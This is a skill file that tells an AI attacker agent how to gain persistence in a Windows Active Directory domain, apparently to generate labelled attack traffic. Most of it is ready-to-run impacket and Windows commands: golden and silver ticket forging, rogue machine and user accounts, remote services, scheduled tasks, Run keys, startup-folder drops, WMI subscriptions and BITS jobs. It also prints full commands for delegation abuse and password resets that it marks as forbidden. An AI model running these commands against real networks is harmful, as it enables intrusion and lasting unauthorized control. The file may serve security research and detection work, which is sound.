---
name: ad-persistence
description: Persistence-phase Active Directory skill for an attacker agent on a domain-joined Windows host. Covers golden/silver tickets, adding domain/local users and machine accounts, scheduled tasks, Run keys, startup folder, WMI events, BITS jobs, and service persistence. persistence.rbcd and persistence.reset-password are forbidden. Load this skill when the task names ad-persistence. Scripts and state.json live in the shared ad-attack skill. Every task must write a display-filter-only {task_id}.txt via write_filter.py.
---

# AD Persistence Skill

Load this skill **only** when the dispatched task names `ad-persistence`. Do not load other phase catalogs.

**Shared runtime.** `cd` to `~/.config/opencode/skills/ad-attack` (or the packaged `attacker/skills/ad-attack`) before any `python scripts/...` call. Follow the Mandatory Execution Protocol in the `ad-attack` skill, including Step 5 (write `{task_id}.txt`).

**Traffic filter contract.** Time-window slicing is a later extract step. This skill writes **only** a Wireshark display filter — never a tshark command, never `frame.time_epoch`. Host-local techniques with no packets use `frame.number == 0`.

# Phase 5: Persistence

## 5.1 Golden Ticket

- Technique id: `persistence.golden-ticket`
- ATT&CK: T1558.001 (Steal or Forge Kerberos Tickets: Golden Ticket)

Purpose: forge a TGT signed with the `krbtgt` hash for long-term domain access.

Inputs: the `krbtgt` user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <krbtgt-hash> -domain-sid <domain.domain_sid> -domain <domain.name> <username>
```

Use the forged ticket:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<domain.dc_fqdn>
```

Outputs:

```
python scripts/state.py add tickets.golden '{"principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if the ticket is rejected, the `krbtgt` hash or SID is stale — `mark-stale` the `krbtgt` user object / `domain.domain_sid` and re-run DCSync.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
(ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (kerberos || tcp.port == 88 || udp.port == 88)) || (ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (smb || msrpc || tcp.port == 445 || tcp.port == 135))
```


## 5.2 Silver Ticket
- Technique id: `persistence.silver-ticket`
- ATT&CK: T1558.002 (Steal or Forge Kerberos Tickets: Silver Ticket)

Purpose: forge a service ticket signed with a specific service account hash.

Inputs: a service account user object's `ntlm_hash`, `domain.domain_sid`, `domain.name`, target `spn`.

Procedure (one atomic action):

```
python -m impacket.examples.ticketer -nthash <service-hash> -domain-sid <domain.domain_sid> -domain <domain.name> -spn <spn> <username>
```

Use it against that service:

```
$env:KRB5CCNAME = "<username>.ccache"
python -m impacket.examples.psexec -k -no-pass <domain.name>/<username>@<target-fqdn>
```

Common SPNs: `cifs/<host-fqdn>`, `HOST/<host-fqdn>`, `ldap/<dc-fqdn>`.

Outputs:

```
python scripts/state.py add tickets.silver '{"spn": "<spn>", "principal": "<username>", "ccache_file": "<username>.ccache"}'
```

Rollback: if rejected, `mark-stale` the service account user object and re-run `credential.dump-secrets`.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (kerberos || smb || msrpc || tcp.port == 88 || tcp.port == 445 || tcp.port == 135)
```


## 5.3 Create Machine Account
- Technique id: `persistence.add-computer`
- ATT&CK: T1136.002 (Create Account: Domain Account)

Purpose: add a machine account (default MAQ permits it) for later RBCD/delegation.

Inputs: `domain.name`, `domain.dc_ip`, an account with `password` from `users`, and `campaign.machine_account` (the chosen name + password). If `campaign.machine_account` is empty, decide an attacker-chosen computer name and password, store them in `campaign.machine_account`, then run the command. Adding a new machine account is allowed; it does not modify any existing account.

Procedure (one atomic action):

```
python -m impacket.examples.addcomputer -computer-name '<campaign.machine_account.name>' -computer-pass '<campaign.machine_account.password>' -dc-ip <domain.dc_ip> <domain.name>/<user>:<password>
```

Outputs:

```
python scripts/state.py add users '{"username": "<campaign.machine_account.name>", "password": "<campaign.machine_account.password>", "is_machine_account": true, "source": "persistence.add-computer"}'
python scripts/changes.py add '{"kind": "create_machine_account", "technique_id": "persistence.add-computer", "target": "<campaign.machine_account.name>", "summary": "Created machine account <campaign.machine_account.name>", "reversal": "Remove-ADComputer -Identity <campaign.machine_account.name>"}'
```

Rollback: if the machine account no longer works, `mark-stale` it and re-create.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || smb || kerberos || tcp.port == 389 || tcp.port == 445 || tcp.port == 88)
```

## 5.4 Resource-Based Constrained Delegation (RBCD)

> **RESTRICTED — DO NOT EXECUTE.** Granting RBCD writes `msDS-AllowedToActOnBehalfOfOtherIdentity` on an existing computer account, which is an in-place modification of existing AD account info and is forbidden by the domain mutation constraints. If a task names `persistence.rbcd`, mark the technique `failed` in `state.json` with reason `forbidden by domain mutation constraints` and end the task.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || smb || tcp.port == 389 || tcp.port == 445)
```

- Technique id: `persistence.rbcd`
- ATT&CK: T1098 (Account Manipulation), T1558.005

Purpose: grant a machine account the right to impersonate on a target computer (RBCD).

Inputs: the machine account from `campaign.machine_account`, the target computer `$` name from `hosts[].machine_account` (populated by `discovery.host-identify`), `domain.dc_ip`, and an account with write DACL on the target.

Procedure (one atomic action):

```
python -m impacket.examples.rbcd -delegate-from '<campaign.machine_account.name>' -delegate-to '<target-machine-account>' -dc-ip <domain.dc_ip> -action write <domain.name>/<user>:<password>
```

Then obtain a ticket impersonating an admin:

```
python -m impacket.examples.getST -spn cifs/<target-fqdn> -impersonate <admin> -dc-ip <domain.dc_ip> <domain.name>/<campaign.machine_account.name>:<campaign.machine_account.password>
```

Outputs:

```
python scripts/state.py add domain.rbcd '{"delegate_from": "<campaign.machine_account.name>", "delegate_to": "<target-machine-account>"}'
python scripts/state.py add tickets.service '{"spn": "cifs/<target-fqdn>", "principal": "<admin>", "impersonated_user": "<admin>", "ccache_file": "<admin>.ccache"}'
python scripts/changes.py add '{"kind": "rbcd", "technique_id": "persistence.rbcd", "target": "<target-machine-account>", "summary": "Granted RBCD from <campaign.machine_account.name> to <target-machine-account>", "reversal": "Set-ADComputer <target-machine-account> -PrincipalsAllowedToDelegateToAccount $null"}'
```

Rollback: if the RBCD edge is revoked, `mark-stale` `domain.rbcd[n]` and re-run this technique.

## 5.5 Reset Account Password

> **RESTRICTED — DO NOT EXECUTE.** Resetting a password modifies an existing AD account in place and is forbidden by the domain mutation constraints. If a task names `persistence.reset-password`, mark the technique `failed` in `state.json` with reason `forbidden by domain mutation constraints` and end the task.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```

- Technique id: `persistence.reset-password`
- ATT&CK: T1098 (Account Manipulation)

Purpose: reset a target account's password with admin rights.

Inputs: an admin account with `password` from `users`, the target user, and the new password (a task-text intent, like the spray candidate).

Procedure (one atomic action):

```
python -m impacket.examples.smbpasswd -newpass <new> -reset <domain.name>/<admin>:<password>@<target-ip>
```

Outputs:

```
python scripts/state.py merge users[<index>] '{"password": "<new>", "stale": false}'
python scripts/changes.py add '{"kind": "reset_password", "technique_id": "persistence.reset-password", "target": "<user>", "summary": "Reset password for <user>", "reversal": "Set-ADAccountPassword -Identity <user> -Reset"}'
```

Rollback: if the reset is later reverted, `mark-stale` the user object and re-run.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```


## 5.6 Windows Service Persistence
- Technique id: `persistence.service`
- ATT&CK: T1543.003 (Create or Modify System Process: Windows Service)

Purpose: install a new Windows service on a compromised host for persistence. This creates a host-local service and does **not** modify any existing AD account (allowed by the domain mutation constraints); record it in `changes.json`.

Inputs: an admin user object with `password` from `users`, the target host, and the service command.

Procedure (one atomic action):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'sc create <svc-name> binPath= "cmd /c <command>" start= auto'
```

Outputs:

```
python scripts/state.py add files '{"path": "<svc-name>", "description": "persistence service on <target-ip>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.service", "target": "<target-ip>", "summary": "Created service <svc-name> on <target-ip>", "reversal": "sc \\\\<target-ip> delete <svc-name>"}'
```

Rollback: if the service is removed, `mark-stale` the file entry and re-create.


Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 5.7 Create Domain User

- Technique id: `persistence.add-user`
- ATT&CK: T1136.002 (Create Account: Domain Account)

Purpose: add a **new** domain user. Do not reset or edit any existing account.

Inputs: `domain.name`, an account with `password` from `users` that can create users. Choose a new username and password (task-text intent, or store under `campaign` then run). Adding a new user is allowed.

Procedure (one atomic action):

```
net user <new-username> <new-password> /add /domain
```

Outputs:

```
python scripts/state.py add users '{"username": "<new-username>", "password": "<new-password>", "source": "persistence.add-user"}'
python scripts/changes.py add '{"kind": "create_user", "technique_id": "persistence.add-user", "target": "<new-username>", "summary": "Created domain user <new-username>", "reversal": "net user <new-username> /delete /domain"}'
```

Rollback: if the user cannot log on, `mark-stale` it and re-create with a different name (do not reset an existing account).

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <dc-ip> && (ldap || smb || kerberos || tcp.port == 389 || tcp.port == 445 || tcp.port == 88)
```


## 5.8 Create Local User

- Technique id: `persistence.local-user`
- ATT&CK: T1136.001 (Create Account: Local Account)

Purpose: add a local SAM user on the attack host.

Inputs: none from domain state. Choose a new local username and password.

Procedure (one atomic action):

```
net user <new-username> <new-password> /add
```

Outputs:

```
python scripts/state.py add users '{"username": "<new-username>", "password": "<new-password>", "source": "persistence.local-user"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.local-user", "target": "<new-username>", "summary": "Created local user <new-username> on attack host", "reversal": "net user <new-username> /delete"}'
```

Rollback: if the account is missing, re-create. Do not modify existing local accounts.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
frame.number == 0
```


## 5.9 Scheduled Task Persistence

- Technique id: `persistence.scheduled-task`
- ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)

Purpose: create a **new** scheduled task on the attack host or a compromised host. Do not modify an existing task.

Inputs: for a remote host, an admin user object with `password` from `users` plus the target host. Command line is a task-text intent (or a path already in `campaign.tools` / `files[]`).

Procedure (one atomic action). Local:

```
schtasks /create /tn <task-name> /tr "<command>" /sc onlogon /rl limited /f
```

Remote (same technique, when the target is a host in `hosts[]`):

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'schtasks /create /tn <task-name> /tr "<command>" /sc onlogon /f'
```

Outputs:

```
python scripts/state.py add files '{"path": "<task-name>", "description": "persistence scheduled task on <target>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.scheduled-task", "target": "<target>", "summary": "Created scheduled task <task-name>", "reversal": "schtasks /delete /tn <task-name> /f"}'
```

Rollback: if the task is removed, `mark-stale` the file entry and re-create.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template (local use `frame.number == 0`; remote use):

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 5.10 Registry Run Key

- Technique id: `persistence.run-key`
- ATT&CK: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)

Purpose: add a **new** Run-key value on the attack host or a compromised host.

Inputs: for a remote host, an admin user object with `password` from `users` plus the target host. The command to persist is a task-text intent.

Procedure (one atomic action). Prefer HKCU when not elevated; HKLM when the session is admin:

```
python -m impacket.examples.wmiexec <domain.name>/<user>:<password>@<target-ip> 'reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <value-name> /t REG_SZ /d "<command>" /f'
```

Local variant: the same `reg add` without wmiexec.

Outputs:

```
python scripts/state.py add files '{"path": "<value-name>", "description": "Run key on <target>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.run-key", "target": "<target>", "summary": "Added Run key <value-name>", "reversal": "reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v <value-name> /f"}'
```

Rollback: if the value is gone, re-add. Do not overwrite unrelated Run values.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template (local use `frame.number == 0`; remote use):

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 5.11 Startup Folder

- Technique id: `persistence.startup-folder`
- ATT&CK: T1547.001 (Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder)

Purpose: drop a file into the common Startup folder on a compromised host.

Inputs: a user object with `password` from `users`, the target host, and a local file from `files[]` or `campaign.tools`.

Procedure (one atomic action):

```
python -m impacket.examples.smbclient <domain.name>/<user>:<password>@<target-fqdn>
```

Inside: `use C$`, `put <local-file> ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\<name>`, `exit`.

Outputs:

```
python scripts/state.py add files '{"path": "<name>", "description": "Startup folder drop on <target-ip>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.startup-folder", "target": "<target-ip>", "summary": "Dropped <name> in Startup folder", "reversal": "del \\\\\\<target-ip>\\C$\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\<name>"}'
```

Rollback: if the file is removed, `put` again.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (smb || tcp.port == 445 || tcp.port == 139)
```


## 5.12 WMI Event Persistence

- Technique id: `persistence.wmi-event`
- ATT&CK: T1546.003 (Event Triggered Execution: Windows Management Instrumentation Event Subscription)

Purpose: install a **new** WMI event subscription on a compromised host via impacket `wmipersist`.

Inputs: an admin user object with `password` from `users`, plus the target host. The payload is a task-text command or a `.vbs` path in `files[]` / `campaign.tools`.

Procedure (one atomic action):

```
python -m impacket.examples.wmipersist <domain.name>/<user>:<password>@<target-ip> -install -name <evt-name> -vbs <vbs-path>
```

Outputs:

```
python scripts/state.py add files '{"path": "<evt-name>", "description": "WMI persist subscription on <target-ip>"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.wmi-event", "target": "<target-ip>", "summary": "Installed WMI persist <evt-name>", "reversal": "python -m impacket.examples.wmipersist <domain>/<user>:<password>@<target-ip> -remove -name <evt-name>"}'
```

Rollback: if the subscription is gone, re-install. Do not edit existing WMI filters.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template:

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (msrpc || smb || tcp.port == 135 || tcp.port == 445)
```


## 5.13 BITS Job Persistence

- Technique id: `persistence.bits-job`
- ATT&CK: T1197 (BITS Jobs)

Purpose: create a **new** BITS job on the attack host (or a compromised host) as persistence.

Inputs: a local or staged file (`files[]`). Optional: a reachable HTTP URL on a host in `state` (do not stand up a new C2). For remote install, an admin user object with `password`.

Procedure (one atomic action). Local:

```
bitsadmin /create /download <job-name> && bitsadmin /addfile <job-name> http://<target-ip>/<file> C:\Windows\Temp\<file> && bitsadmin /SetNotifyCmdLine <job-name> cmd.exe "/c <command>" && bitsadmin /resume <job-name>
```

Or PowerShell: `Start-BitsTransfer` / `Add-BitsFile` against `http://<target-ip>/` or a UNC already in `hosts[].shares`.

Outputs:

```
python scripts/state.py add files '{"path": "<job-name>", "description": "BITS persistence job"}'
python scripts/changes.py add '{"kind": "other", "technique_id": "persistence.bits-job", "target": "<job-name>", "summary": "Created BITS job <job-name>", "reversal": "bitsadmin /cancel <job-name>"}'
```

Rollback: if the job is cancelled, re-create.

Traffic Filter (mandatory; expression only — no tshark command, no `frame.time_epoch`). Fill `<attacker-ip>`, `<dc-ip>`, and `<target-ip>` from `state.json` and the local host. Union extra network actions from this task (including Local Elevation Protocol) with `||`. Then:

```
python scripts/write_filter.py --expression "<filled display filter>"
```

Template (purely local job with no network: `frame.number == 0`; otherwise):

```
ip.addr == <attacker-ip> && ip.addr == <target-ip> && (http || smb || tcp.port == 80 || tcp.port == 445)
```

